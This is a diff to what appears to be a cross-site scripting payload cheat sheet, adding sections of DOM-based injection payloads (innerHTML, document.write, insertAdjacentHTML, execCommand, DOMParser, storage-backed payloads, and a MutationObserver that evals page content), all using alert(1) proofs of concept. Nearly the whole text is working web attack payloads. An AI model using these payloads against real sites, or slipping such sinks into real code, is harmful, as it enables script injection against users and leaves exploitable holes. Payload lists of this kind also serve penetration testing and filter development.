@@ -411,6 +411,39 @@ template.innerHTML = window.name;
 document.body.appendChild(template.content.cloneNode(true));
 </script>
 
+# Advanced DOM Manipulation
+<script>
+document.body.innerHTML = `<img src=x onerror=alert(1)>`;
+document.body.insertAdjacentHTML('beforeend', `<script>alert(1)</script>`);
+document.write(`<iframe src="javascript:alert(1)"></iframe>`);
+</script>
+
+# Advanced DOM Observers
+<script>
+new MutationObserver(mutations => {
+  mutations.forEach(mutation => eval(mutation.target.innerHTML));
+}).observe(document.body, {childList: true, subtree: true});
+
+new IntersectionObserver(entries => {
+  entries.forEach(entry => entry.isIntersecting && alert(1));
+}).observe(document.body);
+</script>
+
+# Advanced DOM Storage Exploitation
+<script>
+localStorage.setItem('xss', '<script>alert(1)</script>');
+document.body.innerHTML = localStorage.getItem('xss');
+sessionStorage.setItem('xss', '<img src=x onerror=alert(1)>');
+document.write(sessionStorage.getItem('xss'));
+</script>
+
+# Advanced DOM API Abuse
+<script>
+document.execCommand('insertHTML', false, '<img src=x onerror=alert(1)>');
+document.implementation.createHTMLDocument().write('<script>alert(1)</script>');
+new DOMParser().parseFromString('<script>alert(1)</script>', 'text/html');
+</script>
+
 # Advanced DOM Clobbering
 <form id=x tabindex=0 onfocus=alert(1)><input id=attributes>
 <form onclick=alert(1)><attributes id=x>
@@ -572,4 +605,4 @@ document.write('&lt;script&gt;alert(1)&lt;/script&gt;');
 
 // Unicode encoding
 eval('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029');
-</script> 
+</script>
